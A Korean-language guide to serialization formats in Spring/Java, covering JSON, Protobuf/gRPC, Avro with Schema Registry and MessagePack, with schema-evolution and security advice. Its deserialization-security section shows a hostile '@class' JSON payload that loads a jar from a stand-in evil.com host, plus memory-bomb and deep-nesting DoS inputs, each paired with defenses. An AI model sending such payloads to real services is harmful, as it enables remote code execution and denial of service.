**1. 금액/포인트: `double` 지양, 정수(최소 단위) 또는 BigDecimal**

```java
// ❌ 잘못된 방법
public class OrderDTO {
    private double totalPrice;  // 부동소수점 오차
}

// 0.1 + 0.2 = 0.30000000000000004

// ✅ 올바른 방법 1: 정수 (최소 단위)
public class OrderDTO {
    private Long totalPriceInCents;  // 센트 또는 원 단위
}

// 10.50달러 = 1050센트
orderDTO.setTotalPriceInCents(1050L);

// ✅ 올바른 방법 2: BigDecimal
public class OrderDTO {
    @JsonSerialize(using = ToStringSerializer.class)
    private BigDecimal totalPrice;
}

// JSON: {"totalPrice": "10.50"}  // 문자열로 직렬화하여 정밀도 유지
```

**2. 시간: UTC 기준 ISO-8601 또는 epoch millis**

```java
@Configuration
public class JacksonConfig {
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.registerModule(new JavaTimeModule());
        
        // ISO-8601 형식 사용
        mapper.disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);
        
        // UTC 타임존
        mapper.setTimeZone(TimeZone.getTimeZone("UTC"));
        
        return mapper;
    }
}

// DTO
public class EventDTO {
    private Instant timestamp;  // "2026-02-03T10:30:00Z"
}
```

**3. 필드 변경: 이름 변경 대신 새 필드 추가 + 기존 필드 유지**

```java
// 3단계 마이그레이션
// Step 1: 새 필드 추가
public class UserDTO {
    @JsonProperty("userName")
    @Deprecated
    private String name;
}

// Step 2: 클라이언트 업데이트 (1-3개월)

// Step 3: 옛 필드 제거
public class UserDTO {
    private String name;
}
```

### 5.2 Protocol Buffers (Protobuf)

**gRPC 및 내부 통신**에서 가장 널리 쓰이는 스키마 기반 포맷입니다.

#### 스키마 정의

```protobuf
// user.proto
syntax = "proto3";

package com.example;

option java_package = "com.example.proto";
option java_outer_classname = "UserProto";

message User {
  int64 id = 1;
  string name = 2;
  string email = 3;
  int32 age = 4;
  bool active = 5;
  repeated string roles = 6;
  Address address = 7;
}

message Address {
  string city = 1;
  string zip_code = 2;
}
```

#### 코드 생성

```bash
# Protobuf 컴파일러로 Java 코드 생성
protoc --java_out=src/main/java user.proto

# Maven 플러그인 사용
<plugin>
    <groupId>org.xolstice.maven.plugins</groupId>
    <artifactId>protobuf-maven-plugin</artifactId>
    <version>0.6.1</version>
    <configuration>
        <protocArtifact>
            com.google.protobuf:protoc:3.19.4:exe:${os.detected.classifier}
        </protocArtifact>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>compile</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

#### 사용 예시

```java
// 직렬화
User user = User.newBuilder()
    .setId(123L)
    .setName("홍길동")
    .setEmail("hong@example.com")
    .setAge(30)
    .setActive(true)
    .addRoles("USER")
    .addRoles("ADMIN")
    .setAddress(Address.newBuilder()
        .setCity("서울")
        .setZipCode("12345")
        .build())
    .build();

byte[] bytes = user.toByteArray();  // 바이너리로 직렬화

// 역직렬화
User deserializedUser = User.parseFrom(bytes);
System.out.println(deserializedUser.getName());  // "홍길동"
```

#### gRPC 서비스 정의

```protobuf
// user_service.proto
syntax = "proto3";

service UserService {
  rpc GetUser(GetUserRequest) returns (User);
  rpc CreateUser(CreateUserRequest) returns (User);
  rpc ListUsers(ListUsersRequest) returns (stream User);  // 스트리밍
}

message GetUserRequest {
  int64 user_id = 1;
}

message CreateUserRequest {
  string name = 1;
  string email = 2;
  int32 age = 3;
}

message ListUsersRequest {
  int32 page = 1;
  int32 page_size = 2;
}
```

#### gRPC 서버 구현

```java
@GrpcService
public class UserServiceImpl extends UserServiceGrpc.UserServiceImplBase {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public void getUser(GetUserRequest request, 
                       StreamObserver<User> responseObserver) {
        
        Long userId = request.getUserId();
        
        com.example.entity.User entity = userRepository
            .findById(userId)
            .orElseThrow(() -> new StatusRuntimeException(Status.NOT_FOUND));
        
        User response = User.newBuilder()
            .setId(entity.getId())
            .setName(entity.getName())
            .setEmail(entity.getEmail())
            .setAge(entity.getAge())
            .build();
        
        responseObserver.onNext(response);
        responseObserver.onCompleted();
    }
    
    @Override
    public void listUsers(ListUsersRequest request, 
                         StreamObserver<User> responseObserver) {
        
        int page = request.getPage();
        int pageSize = request.getPageSize();
        
        PageRequest pageRequest = PageRequest.of(page, pageSize);
        Page<com.example.entity.User> users = userRepository.findAll(pageRequest);
        
        // 스트리밍 응답
        for (com.example.entity.User entity : users) {
            User user = User.newBuilder()
                .setId(entity.getId())
                .setName(entity.getName())
                .setEmail(entity.getEmail())
                .build();
            
            responseObserver.onNext(user);
        }
        
        responseObserver.onCompleted();
    }
}
```

#### gRPC 클라이언트 호출

```java
@Service
public class UserGrpcClient {
    
    @GrpcClient("user-service")
    private UserServiceBlockingStub userServiceStub;
    
    public User getUser(Long userId) {
        GetUserRequest request = GetUserRequest.newBuilder()
            .setUserId(userId)
            .build();
        
        try {
            return userServiceStub.getUser(request);
        } catch (StatusRuntimeException e) {
            if (e.getStatus().getCode() == Status.Code.NOT_FOUND) {
                throw new UserNotFoundException(userId);
            }
            throw e;
        }
    }
}
```

#### 장점

**1. payload가 작고 빠름**

```
크기:
JSON:     54 bytes
Protobuf: 25 bytes (54% 감소)

속도:
직렬화: JSON 100ms vs Protobuf 10ms (10배 빠름)
역직렬화: JSON 120ms vs Protobuf 15ms (8배 빠름)

메모리:
JSON:     10MB
Protobuf: 2MB (80% 감소)
```

**2. 타입이 명확, 코드 생성으로 안정적인 계약 유지**

```java
// 컴파일 타임에 타입 체크
User user = User.newBuilder()
    .setAge("30")  // 컴파일 에러! int만 허용
    .build();

// 필드 누락 방지
User user = User.newBuilder()
    // .setId() 없음 → 기본값(0) 사용
    .setName("홍길동")
    .build();

System.out.println(user.getId());  // 0
```

**3. unknown field 처리 등 호환성 전략이 체계적**

```protobuf
// v1
message User {
  int64 id = 1;
  string name = 2;
}

// v2 (Backward & Forward Compatible)
message User {
  int64 id = 1;
  string name = 2;
  string email = 3;     // 새 필드 추가
  // int32 age = 4;     // 필드 "삭제" (주석 처리, 번호 보존)
  string phone = 5;     // 또 다른 새 필드
}

// 호환성 규칙:
// 1. 필드 번호는 절대 재사용하지 않음
// 2. 필드 추가는 자유롭게
// 3. 필드 "삭제"는 주석 처리 (reserved 키워드)
```

#### 단점

**1. 사람이 바로 읽기 어려움**

```bash
# Protobuf 바이너리
$ xxd message.bin
00000000: 087b 1209 ed99 8dea b8b8 eb8f 991a 1468  .{.............h
00000010: 6f6e 6740 6578 616d 706c 652e 636f 6d20  ong@example.com 
00000020: 1e28 01                                  .(.

# 디버깅 도구 필요
$ protoc --decode=User user.proto < message.bin
id: 123
name: "홍길동"
email: "hong@example.com"
```

**2. 스키마 파일 및 생성 코드 운영 비용**

```
프로젝트 구조:
proto/
  ├── user.proto
  ├── order.proto
  └── product.proto

운영 과제:
1. .proto 파일 버전 관리
2. 코드 생성 자동화 (CI/CD)
3. 다른 팀과 스키마 공유
4. 스키마 변경 시 영향 분석
5. 호환성 검증
```

### 5.3 Apache Avro

**Kafka/데이터 파이프라인**에서 강점을 가지는 스키마 기반 포맷입니다.

#### 스키마 정의

```json
{
  "type": "record",
  "name": "User",
  "namespace": "com.example.avro",
  "fields": [
    {"name": "id", "type": "long"},
    {"name": "name", "type": "string"},
    {"name": "email", "type": ["null", "string"], "default": null},
    {"name": "age", "type": "int"},
    {"name": "active", "type": "boolean", "default": true},
    {
      "name": "roles",
      "type": {
        "type": "array",
        "items": "string"
      }
    },
    {
      "name": "address",
      "type": {
        "type": "record",
        "name": "Address",
        "fields": [
          {"name": "city", "type": "string"},
          {"name": "zipCode", "type": "string"}
        ]
      }
    }
  ]
}
```

#### Kafka와 Schema Registry 연동

```yaml
# application.yml
spring:
  kafka:
    bootstrap-servers: localhost:9092
    properties:
      schema.registry.url: http://localhost:8081
      
    producer:
      key-serializer: org.apache.kafka.common.serialization.StringSerializer
      value-serializer: io.confluent.kafka.serializers.KafkaAvroSerializer
      properties:
        acks: all
        
    consumer:
      key-deserializer: org.apache.kafka.common.serialization.StringDeserializer
      value-deserializer: io.confluent.kafka.serializers.KafkaAvroDeserializer
      properties:
        specific.avro.reader: true
        auto.offset.reset: earliest
```

#### Producer 구현

```java
@Service
public class UserEventProducer {
    
    @Autowired
    private KafkaTemplate<String, GenericRecord> kafkaTemplate;
    
    public void sendUserCreated(User user) throws IOException {
        // Avro 스키마 로드
        Schema schema = new Schema.Parser().parse(
            getClass().getResourceAsStream("/avro/user.avsc")
        );
        
        // GenericRecord 생성
        GenericRecord record = new GenericData.Record(schema);
        record.put("id", user.getId());
        record.put("name", user.getName());
        record.put("email", user.getEmail());
        record.put("age", user.getAge());
        record.put("active", user.isActive());
        record.put("roles", user.getRoles());
        
        // 주소
        GenericRecord address = new GenericData.Record(
            schema.getField("address").schema()
        );
        address.put("city", user.getAddress().getCity());
        address.put("zipCode", user.getAddress().getZipCode());
        record.put("address", address);
        
        // Kafka 전송
        // Schema Registry에 자동으로 스키마 등록
        kafkaTemplate.send("user-events", user.getId().toString(), record);
        
        log.info("사용자 생성 이벤트 발행: userId={}", user.getId());
    }
}
```

#### Consumer 구현

```java
@Service
public class UserEventConsumer {
    
    @KafkaListener(topics = "user-events", groupId = "notification-service")
    public void handleUserCreated(GenericRecord record) {
        // Avro 레코드에서 데이터 추출
        Long id = (Long) record.get("id");
        String name = (String) record.get("name");
        String email = (String) record.get("email");
        Integer age = (Integer) record.get("age");
        Boolean active = (Boolean) record.get("active");
        
        @SuppressWarnings("unchecked")
        List<String> roles = (List<String>) record.get("roles");
        
        GenericRecord address = (GenericRecord) record.get("address");
        String city = (String) address.get("city");
        
        log.info("사용자 생성 이벤트 수신: id={}, name={}, city={}", 
            id, name, city);
        
        // 비즈니스 로직 처리
        notificationService.sendWelcomeEmail(email, name);
    }
}
```

#### 스키마 진화

```json
// v1
{
  "type": "record",
  "name": "User",
  "fields": [
    {"name": "id", "type": "long"},
    {"name": "name", "type": "string"}
  ]
}

// v2 (Backward Compatible)
{
  "type": "record",
  "name": "User",
  "fields": [
    {"name": "id", "type": "long"},
    {"name": "name", "type": "string"},
    {"name": "email", "type": ["null", "string"], "default": null}
  ]
}

// v3 (Full Compatible)
{
  "type": "record",
  "name": "User",
  "fields": [
    {"name": "id", "type": "long"},
    {"name": "name", "type": "string"},
    {"name": "email", "type": ["null", "string"], "default": null},
    {"name": "phone", "type": ["null", "string"], "default": null}
  ]
}
```

#### Schema Registry 호환성 검증

```bash
# 호환성 확인
curl -X POST http://localhost:8081/compatibility/subjects/user-value/versions/latest \
  -H "Content-Type: application/vnd.schemaregistry.v1+json" \
  -d @new-schema.json

# 응답
# {"is_compatible": true}

# 스키마 등록
curl -X POST http://localhost:8081/subjects/user-value/versions \
  -H "Content-Type: application/vnd.schemaregistry.v1+json" \
  -d @new-schema.json

# 응답
# {"id": 2}  // 새 스키마 ID
```

#### 장점

**1. 스키마 레지스트리 기반 운영에 적합**

```
Producer --Avro--> Kafka --Avro--> Consumer
    |                                  |
    +---> Schema Registry <-----------+
          (호환성 검증, 버전 관리)

메시지 구조:
[Magic Byte][Schema ID][Avro Payload]
[0x00]      [0x00,0x00,0x00,0x01][바이너리 데이터]

장점: 메시지에 스키마 포함 안 함 → 크기 최소화
```

**2. 이벤트 스트리밍, 데이터 레이크 적재 등과 궁합이 좋음**

```java
// Kafka → S3 적재 (Avro 포맷 유지)
@Service
public class DataLakeService {
    
    @KafkaListener(topics = "user-events")
    public void archiveToS3(GenericRecord record) {
        // Avro 레코드를 그대로 S3에 저장
        // 스키마는 Schema Registry에서 관리
        String key = String.format("user-events/%s/%s.avro",
            LocalDate.now(), UUID.randomUUID());
        
        s3Client.putObject(bucket, key, record.toByteArray());
    }
}
```

#### 단점

**1. 운영 난이도 증가**

```
필요한 인프라:
- Kafka Cluster (고가용성)
- Schema Registry Cluster (고가용성)
- 모니터링 (스키마 버전, 호환성, 지연시간)

운영 과제:
- Schema Registry 장애 시 Producer/Consumer 모두 실패
- 스키마 버전 관리 프로세스
- 호환성 정책 수립 (BACKWARD, FORWARD, FULL)
- 스키마 변경 배포 절차
```

**2. 디버깅 난이도**

```bash
# Kafka 메시지를 직접 보기 어려움
kafka-console-consumer --bootstrap-server localhost:9092 \
  --topic user-events --from-beginning

# 바이너리 출력
# ??홍길동hong@example.com...

# Avro 도구 필요
kafka-avro-console-consumer \
  --bootstrap-server localhost:9092 \
  --topic user-events \
  --from-beginning \
  --property schema.registry.url=http://localhost:8081

# 정상 출력
# {"id":123,"name":"홍길동","email":"hong@example.com",...}
```

### 5.4 MessagePack / CBOR

**JSON과 유사한 모델을 유지하면서 바이너리로 효율을 얻는 선택**입니다.

#### MessagePack 예시

```java
// MessagePack 의존성
<dependency>
    <groupId>org.msgpack</groupId>
    <artifactId>msgpack-core</artifactId>
    <version>0.9.3</version>
</dependency>

// 직렬화
ObjectMapper mapper = new ObjectMapper(new MessagePackFactory());
byte[] bytes = mapper.writeValueAsBytes(userDTO);

// 역직렬화
UserDTO user = mapper.readValue(bytes, UserDTO.class);
```

#### 장점

- JSON보다 작고 빠름
- JSON과 유사한 모델 (학습 곡선 낮음)

#### 단점

- 가독성/디버깅 편의는 JSON보다 낮음
- 생태계가 Protobuf/Avro보다 작음

---

## 6. 포맷 선택 기준 (결정에 필요한 질문)

포맷을 선택할 때는 다음 질문으로 정리하면 안전합니다.

### 6.1 의사결정 트리

```
Q1: 대상은 외부(클라이언트)인가, 내부(서비스 간)인가?
    외부 → JSON
    내부 → Q2

Q2: 사람이 읽고 디버깅해야 하는가?
    Yes → JSON
    No  → Q3

Q3: payload 크기/지연 시간이 병목인가?
    No  → JSON
    Yes → Q4

Q4: 이벤트 스트리밍(Kafka)인가?
    Yes → Avro + Schema Registry
    No  → Protobuf + gRPC

Q5: 버전 호환성(스키마 진화)이 장기 운영에서 중요한가?
    Yes → Avro/Protobuf (스키마 기반)
    No  → JSON

Q6: 다언어(Polyglot) 환경인가?
    Yes → JSON 또는 Protobuf
    No  → JSON
```

### 6.2 추천 패턴

#### 외부 공개 API
```
선택: JSON

이유:
- 범용성 (모든 플랫폼 지원)
- 디버깅 편의 (Chrome DevTools, curl, Postman)
- 빠른 개발 속도
- 문서화 용이

예시:
[Mobile App] --JSON/REST--> [API Gateway] --JSON--> [Backend]
```

#### 내부 서비스 통신
```
선택: gRPC + Protobuf

이유:
- 높은 성능 (JSON 대비 10배 빠름)
- 타입 안전성
- HTTP/2 기반 (멀티플렉싱)
- 스트리밍 지원

예시:
[API Gateway] --gRPC/Protobuf--> [User Service]
                                  [Order Service]
                                  [Payment Service]
```

#### 이벤트 스트리밍
```
선택: Kafka + Avro + Schema Registry

이유:
- 스키마 진화 관리
- 다수 컨슈머 지원
- 메시지 크기 최소화
- 호환성 자동 검증

예시:
[Order Service] --Avro--> Kafka Topic: order-events
                            |
                            +-> [Notification Service]
                            +-> [Analytics Service]
                            +-> [Email Service]
```

#### 캐시/세션
```
선택 A: JSON (디버깅 중시)
- Redis CLI로 직접 확인 가능
- 운영 중 문제 파악 용이

선택 B: MessagePack (성능 중시)
- JSON보다 작고 빠름
- 하지만 디버깅 어려움

기준:
- 캐시 히트율 높고 트래픽 많음 → 성능 중시
- 캐시 정책 튜닝 필요 → 디버깅 중시
```

---

## 7. 역직렬화에서 자주 터지는 문제와 방어 전략

### 7.1 신뢰할 수 없는 입력을 그대로 역직렬화

외부 입력(HTTP body, 메시지)을 위험한 설정으로 역직렬화하면 다음 문제가 발생할 수 있습니다.

#### 문제 1: 메모리 폭탄 (DoS)

```java
// 악의적인 JSON
{
  "items": [
    {"id": 1}, {"id": 2}, ... // 100만 개
  ]
}

// 서버에서 역직렬화 시도
@PostMapping("/batch")
public void processBatch(@RequestBody BatchRequest request) {
    // OutOfMemoryError!
}
```

**방어 전략:**

```yaml
# application.yml
spring:
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB

server:
  tomcat:
    max-http-post-size: 10MB
```

```java
// DTO에 크기 제한
public class BatchRequest {
    @Size(max = 1000, message = "최대 1000개까지 처리 가능")
    @Valid
    private List<ItemDTO> items;
}
```

#### 문제 2: 타입 혼동 (Polymorphic Deserialization)

```java
// ❌ 위험한 다형성 역직렬화
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
public interface Command {}

// 공격자가 악의적인 타입 주입
{
  "@class": "java.net.URLClassLoader",
  "url": ["http://evil.com/malicious.jar"]
}

// 역직렬화 시 임의 코드 실행 가능!
```

**방어 전략:**

```java
// ✅ 안전: 명시적 타입 매핑
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
@JsonSubTypes({
    @JsonSubTypes.Type(value = CreateUserCommand.class, name = "CREATE_USER"),
    @JsonSubTypes.Type(value = UpdateUserCommand.class, name = "UPDATE_USER")
})
public interface Command {}

// JSON에서 허용된 타입만 사용 가능
{
  "@type": "CREATE_USER",
  "username": "hong"
}
```

#### 문제 3: 깊은 중첩 (Stack Overflow)

```java
// 악의적인 깊은 중첩
{
  "data": {
    "data": {
      "data": {
        ... // 10,000 단계 중첩
      }
    }
  }
}

// StackOverflowError 발생
```

**방어 전략:**

```java
@Configuration
public class JacksonConfig {
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        
        // 깊이 제한
        JsonFactory factory = mapper.getFactory();
        factory.setStreamReadConstraints(
            StreamReadConstraints.builder()
                .maxNestingDepth(100)
                .build()
        );
        
        return mapper;
    }
}
```

#### 종합 방어 전략

```java
@RestControllerAdvice
public class SecurityConfig {
    
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        
        // 1. 다형성 역직렬화 비활성화
        mapper.deactivateDefaultTyping();
        
        // 2. 알 수 없는 필드 무시
        mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
        
        // 3. 깊이 제한
        JsonFactory factory = mapper.getFactory();
        factory.setStreamReadConstraints(
            StreamReadConstraints.builder()
                .maxNestingDepth(100)
                .build()
        );
        
        return mapper;
    }
}

// 4. DTO 검증
public class UserRequest {
    @NotBlank
    @Size(min = 2, max = 50)
    private String name;
    
    @Email
    private String email;
    
    @Min(0) @Max(150)
    private Integer age;
    
    @Size(max = 10)
    private List<String> roles;
}

// 5. Controller에서 검증 자동 적용
@PostMapping("/users")
public ResponseEntity<?> createUser(
        @RequestBody @Valid UserRequest request) {
    // @Valid가 자동으로 검증
}
```

### 7.2 필드 변경으로 인한 호환성 붕괴

가장 흔한 장애 원인입니다.

#### 팀 규칙 (권장)

```
필드 추가: ✓ 안전
필드 삭제: ✗ 위험 (구버전 소비자가 읽지 못함)
필드 이름 변경: ✗ 위험 (사실상 삭제+추가)
필드 타입 변경: ✗✗ 매우 위험
```

#### 안전한 필드 변경 절차

**1단계: 새 필드 추가, 기존 필드 유지**

```java
public class UserDTO {
    @JsonProperty("userName")
    @Deprecated
    private String name;
    
    public String getUserName() {
        return name;
    }
    
    public void setUserName(String name) {
        this.name = name;
    }
    
    public String getName() {
        return name;
    }
    
    public void setName(String name) {
        this.name = name;
    }
}

// JSON: {"userName": "홍길동", "name": "홍길동"}
```

**2단계: 모든 클라이언트를 1단계 버전으로 업그레이드**

```
충분한 디프리케이션 기간: 1-3개월

모니터링:
- 옛 필드(userName) 사용 추적
- 모든 클라이언트가 새 필드(name)로 전환 확인
```

**3단계: 옛 필드 제거**

```java
public class UserDTO {
    private String name;
}

// JSON: {"name": "홍길동"}
```

#### 버전 관리 전략

**방법 1: URL 버저닝**

```java
@RestController
@RequestMapping("/v1/users")
public class UserV1Controller {
    @GetMapping("/{id}")
    public UserV1DTO getUser(@PathVariable Long id) {
        // v1 응답
    }
}

@RestController
@RequestMapping("/v2/users")
public class UserV2Controller {
    @GetMapping("/{id}")
    public UserV2DTO getUser(@PathVariable Long id) {
        // v2 응답
    }
}
```

**방법 2: Accept 헤더 버저닝**

```java
@RestController
@RequestMapping("/users")
public class UserController {
    
    @GetMapping(value = "/{id}", 
                produces = "application/vnd.myapp.v1+json")
    public UserV1DTO getUserV1(@PathVariable Long id) {
        // v1 응답
    }
    
    @GetMapping(value = "/{id}", 
                produces = "application/vnd.myapp.v2+json")
    public UserV2DTO getUserV2(@PathVariable Long id) {
        // v2 응답
    }
}
```

**방법 3: 필드에 버전 정보 포함**

```java
public class UserDTO {
    private String schemaVersion = "2.0";
    private Long id;
    private String name;
    private String email;
}

// 역직렬화 시 버전 확인
public UserDTO deserialize(String json) throws IOException {
    JsonNode node = objectMapper.readTree(json);
    String version = node.get("schemaVersion").asText();
    
    if ("1.0".equals(version)) {
        return deserializeV1(json);
    } else if ("2.0".equals(version)) {
        return deserializeV2(json);
    } else {
        throw new UnsupportedVersionException(version);
    }
}
```

### 7.3 날짜/타임존 불일치

서버/클라이언트, 서비스 간 타임존 정책이 다르면 통계와 정합성이 깨집니다.

#### 문제 상황

```java
// 서버: 한국 (UTC+9)
LocalDateTime now = LocalDateTime.now();  // 2026-02-03 19:30:00
eventRepository.save(new Event(now));

// DB 저장: "2026-02-03 19:30:00"

// 다른 서버: 미국 (UTC-5)
Event event = eventRepository.findById(id);
LocalDateTime time = event.getOccurredAt();  // "2026-02-03 19:30:00"

// 문제: UTC-5로 해석하면 실제로는 다른 시각!
```

#### 해결책: UTC로 통일

```java
@Configuration
public class JacksonConfig {
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.registerModule(new JavaTimeModule());
        
        // UTC 타임존
        mapper.setTimeZone(TimeZone.getTimeZone("UTC"));
        
        // ISO-8601 형식
        mapper.disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);
        
        return mapper;
    }
}

// Entity
@Entity
public class Event {
    @Id
    private Long id;
    
    // Instant: UTC 기반, 타임존 정보 포함
    private Instant occurredAt;
    
    @PrePersist
    public void prePersist() {
        occurredAt = Instant.now();  // 항상 UTC
    }
}

// DTO
public class EventDTO {
    private Long id;
    
    @JsonFormat(pattern = "yyyy-MM-dd'T'HH:mm:ss'Z'", timezone = "UTC")
    private Instant occurredAt;
}

// JSON: {"id": 123, "occurredAt": "2026-02-03T10:30:00Z"}
```

---

## 8. 스프링(자바) 기준 실무 포인트

### 8.1 엔티티를 그대로 API 응답으로 노출하지 않는다

JPA 엔티티를 JSON으로 직접 반환하면 다음 문제가 생깁니다.

#### 문제점

1. LAZY 로딩으로 인한 N+1 쿼리
2. 양방향 관계로 인한 순환 참조
3. 내부 필드의 의도치 않은 노출

#### 해결책: DTO 패턴

```java
// Response DTO
public class UserResponse {
    private Long id;
    private String name;
    private String email;
    private List<OrderSummary> recentOrders;
    
    public static UserResponse from(User user) {
        UserResponse response = new UserResponse();
        response.setId(user.getId());
        response.setName(user.getName());
        response.setEmail(user.getEmail());
        
        response.setRecentOrders(
            user.getOrders().stream()
                .sorted((o1, o2) -> o2.getOrderedAt().compareTo(o1.getOrderedAt()))
                .limit(3)
                .map(OrderSummary::from)
                .collect(Collectors.toList())
        );
        
        return response;
    }
}

// Controller
@GetMapping("/users/{id}")
public UserResponse getUser(@PathVariable Long id) {
    User user = userRepository.findByIdWithRecentOrders(id).orElseThrow();
    return UserResponse.from(user);
}
```

### 8.2 Jackson(ObjectMapper) 설정을 표준화한다

```java
@Configuration
public class JacksonConfig {
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        
        // JavaTime 모듈
        mapper.registerModule(new JavaTimeModule());
        
        // ISO-8601
        mapper.disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);
        
        // UTC
        mapper.setTimeZone(TimeZone.getTimeZone("UTC"));
        
        // 알 수 없는 필드 무시
        mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
        
        // null 필드 제외
        mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);
        
        return mapper;
    }
}
```

### 8.3 숫자 정밀도(금액, 포인트)

```java
// ❌ double 사용 (오차 발생)
public class OrderDTO {
    private double totalPrice;  // 0.1 + 0.2 = 0.30000000000000004
}

// ✅ 정수 사용 (최소 단위)
public class OrderDTO {
    private Long totalPriceInCents;  // 1050 = 10.50달러
}

// ✅ BigDecimal 사용
public class OrderDTO {
    @JsonSerialize(using = ToStringSerializer.class)
    private BigDecimal totalPrice;  // "10.50"
}
```

### 8.4 입력 검증은 역직렬화 다음 단계에서 확실히

```java
public class UserRequest {
    @NotBlank
    @Size(min = 2, max = 50)
    private String name;
    
    @Email
    private String email;
    
    @Min(0) @Max(150)
    private Integer age;
}

@PostMapping("/users")
public ResponseEntity<?> createUser(
        @RequestBody @Valid UserRequest request) {
    // @Valid가 자동 검증
}
```

---

## 9. 체크리스트: 운영 품질을 위한 직렬화 설계

### 9.1 API/메시지 계약
- [ ] 필드 추가/삭제/변경 규칙을 문서화했다
- [ ] 버전 필드 또는 버저닝 정책을 합의했다
- [ ] 날짜/시간/정밀도/nullable 정책이 일관적이다

### 9.2 성능
- [ ] payload 크기와 파싱 비용이 병목인지 측정했다
- [ ] 캐시/메시지에서는 포맷을 목적에 맞게 선택했다
- [ ] 불필요한 중첩 구조/중복 필드를 제거했다

### 9.3 보안
- [ ] 외부 입력 역직렬화에 대해 타입 제한을 적용했다
- [ ] 입력 크기/깊이 제한과 검증을 적용했다
- [ ] 엔티티 직접 노출을 피하고 DTO로 경계를 분리했다

---

## 10. 결론

직렬화는 "데이터를 문자열로 바꾸는 기술"이 아니라, **서비스 간 계약을 정의하고 운영 안정성을 설계하는 영역**입니다. 

JSON은 범용성과 디버깅 편의로 API에서 강력하고, 스키마 기반 포맷(Protobuf/Avro)은 성능과 호환성 전략을 통해 내부 통신과 이벤트 플랫폼에서 가치를 제공합니다.

프로젝트의 성격(외부/내부, 트래픽, 다언어, 장기 운영)을 기준으로 포맷과 정책을 정하고, DTO 경계와 검증, 버전 전략까지 함께 설계하는 것이 실무에서 가장 안전합니다.

---

## 레퍼런스

- *HTTP: The Definitive Guide* (David Gourley 외)
- Spring Framework / Spring Boot 공식 문서
- Jackson Databind 공식 문서
- Protocol Buffers 공식 문서
- Apache Avro 공식 문서
- OWASP: Deserialization of Untrusted Data
